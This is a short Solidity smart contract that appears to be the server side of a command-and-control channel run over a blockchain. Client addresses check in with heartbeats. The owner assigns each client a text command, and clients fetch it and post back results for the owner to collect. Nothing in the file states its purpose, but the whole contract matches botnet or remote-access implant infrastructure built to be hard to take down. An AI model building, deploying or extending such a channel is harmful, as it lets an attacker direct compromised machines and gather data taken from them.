//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract EntryPoint {
    address owner;
    mapping(address => uint256) public heartbeats;
    mapping(address => string) private command;
    mapping(address => bool) private current_command_is_done;
    mapping(address => string) private command_result;
    
    function beat() external {
        heartbeats[msg.sender] = block.timestamp;
    }
    function setCommand(string memory _text,address _addr) external {
        require(msg.sender == owner, "Only owner can call this method");
        command[_addr] = _text;
        current_command_is_done[_addr] = false;
    }
    function getCommand() external returns (string memory){
        heartbeats[msg.sender] = block.timestamp;
        return command[msg.sender];
    }
    function setCommandResult(string memory _text) external {
        require(heartbeats[msg.sender] != 0);
        heartbeats[msg.sender] = block.timestamp;
        command_result[msg.sender] = _text;
        current_command_is_done[msg.sender]=true;
    }
    function getDone(address _addr) external view returns (bool){
        return current_command_is_done[_addr];
    }
    function getCommandResult(address _addr) external view returns (string memory) {
        return command_result[_addr];
    }
    
    constructor(){
        owner = msg.sender;
    }


}